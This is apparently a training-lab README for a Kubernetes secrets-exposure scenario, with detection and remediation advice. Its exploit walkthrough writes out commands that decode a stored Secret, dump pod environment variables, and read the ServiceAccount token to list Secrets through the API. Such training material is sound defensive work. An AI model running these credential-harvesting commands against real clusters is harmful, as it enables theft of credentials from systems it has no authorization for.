# Scenario 05 — Secrets Exposure

| | |
|---|---|
| **Vulnerability class** | Secret storage, process environment, and RBAC |
| **Difficulty** | ⭐ Easy |
| **Backends** | kind and AKS |
| **Namespace** | `secrets-exp` |
| **MITRE ATT&CK for Containers** | [T1552 Unsecured Credentials](https://attack.mitre.org/techniques/T1552/), [T1552.001 Credentials in Files](https://attack.mitre.org/techniques/T1552/001/) |

## What it is

The sample uses fake credentials in a ConfigMap, injects a Kubernetes Secret
into environment variables, and grants the namespace's `default` ServiceAccount
permission to list and read every Secret in that namespace.

## Why it matters

ConfigMaps are not secret stores. Secret values are base64-encoded in API
responses, not protected from principals that can read them. Environment
variables can leak through process inspection, child processes, diagnostics,
and logs. Broad Secret RBAC turns an ordinary pod compromise into credential
theft.

## Deploy just this scenario

```powershell
kubectl apply -f scenarios/05-secrets-exposure/manifest.yaml
kubectl -n secrets-exp wait --for=condition=Available deployment --all --timeout=180s
```

## Exploit walkthrough

Inspect the deliberately exposed ConfigMap and encoded Secret from an
authorized workstation:

```powershell
kubectl -n secrets-exp get configmap app-config -o yaml
kubectl -n secrets-exp get secret app-secret -o jsonpath='{.data.JWT_SIGNING_KEY}'
```

Decode the sample JWT signing key in PowerShell:

```powershell
$encoded = kubectl -n secrets-exp get secret app-secret -o jsonpath='{.data.JWT_SIGNING_KEY}'
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
```

From the app pod, observe injected environment values and exercise the default
ServiceAccount's over-broad permission:

```powershell
$pod = kubectl -n secrets-exp get pod -l app=app -o jsonpath='{.items[0].metadata.name}'
kubectl -n secrets-exp exec $pod -- env
kubectl -n secrets-exp exec $pod -- sh -c 'apk add --no-cache curl >/dev/null && TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/secrets-exp/secrets'
```

The manifest contains fake lab strings only; never substitute real credentials.

## What success looks like

The fake values are readable in the ConfigMap, decoded from the Secret, and
returned by an API request authenticated as the namespace `default`
ServiceAccount.

## Detection

- Audit events for `get`/`list` on Secrets identify the requesting principal
  and namespace.
- Falco may detect reads of projected credentials or unusual API connections.
- Trivy, Kubescape, and similar scanners can flag credentials in ConfigMaps,
  environment-variable secret injection, or overly broad RBAC.

## Remediation

- Store sensitive values in a Secret manager; use encryption at rest or an
  external secret provider.
- Mount credentials as read-only files when appropriate, and disable service
  account token automount where the workload does not use the Kubernetes API.
- Scope RBAC to the minimum verb, resource, namespace, and resource names
  required. Do not grant `list` on every Secret.

**Before:** `envFrom: [{ secretRef: { name: app-secret } }]` and a role granting
`get/list` on all Secrets.

**After:** mount only required data and grant no Secret API access to the
workload if it does not need it.

## Suggested order

Try this early, after scenario 01. It pairs well with the identity lesson while
showing how storage and process configuration create separate leak paths.
